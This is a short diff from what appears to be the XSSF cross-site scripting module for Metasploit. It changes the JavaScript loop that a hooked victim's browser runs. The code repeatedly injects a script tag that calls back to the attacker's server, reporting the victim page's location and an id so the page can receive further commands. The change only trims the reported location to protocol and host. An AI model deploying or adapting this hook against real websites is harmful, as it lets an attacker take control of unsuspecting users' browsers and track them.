@@ -388,7 +388,7 @@ module Msf
 					function XSSF_EXECUTE_LOOP() {
 						try { if (document.getElementById('XSSF_CODE') != null) document.body.removeChild(document.getElementById('XSSF_CODE')); } catch(e) {}
 						script = document.createElement('script');	script.id = "XSSF_CODE";
-						script.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ASK}?#{PARAM_LOCATION}=" + encodeURI(window.location) + "&#{PARAM_ID}=#{id}&time=" + escape(new Date().getTime());
+						script.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ASK}?#{PARAM_LOCATION}=" + window.location.protocol + "//" + window.location.host + "&#{PARAM_ID}=#{id}&time=" + escape(new Date().getTime());
 						document.body.appendChild(script);
 					}
 	
